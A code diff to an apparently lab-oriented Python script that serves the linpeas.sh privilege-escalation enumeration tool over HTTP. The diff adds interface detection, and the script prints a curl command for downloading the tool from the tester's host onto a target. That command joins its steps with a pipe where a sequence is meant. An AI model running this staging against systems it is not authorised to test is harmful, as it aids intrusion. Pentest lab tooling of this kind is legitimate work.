@@ -5,6 +5,7 @@ import socketserver
 import threading
 import netifaces as ni
 from utils.security import SecurityHTTPRequestHandler
+import psutil
 
 LINPEAS_URL = "https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh"
 DEFAULT_PORT = 1337
@@ -34,6 +35,17 @@ def serve(port):
 
     with socketserver.TCPServer(("", port), handler) as httpd:
         httpd.serve_forever()
+
+def get_interface():
+    # this isnt perfect but will work
+
+    interfaces = psutil.net_if_addrs()
+    print(interfaces.keys())
+
+    if DEFAULT_INTERFACE in interfaces.keys():
+        return DEFAULT_INTERFACE
+
+    return next(iter(interfaces.keys()))
 
 def main():
 
@@ -72,7 +84,7 @@ def main():
     t.start()
 
     # Step 3: get IP from OpenVPN Connection
-    ip = ni.ifaddresses(interface)[ni.AF_INET][0]['addr']
+    ip = ni.ifaddresses(get_interface())[ni.AF_INET][0]['addr']
 
     # Step 4: provide user with information
     print(f"Get linpeas with: curl -L http://{ip}:{port}/l.sh > l.sh | chmod +x l.sh")
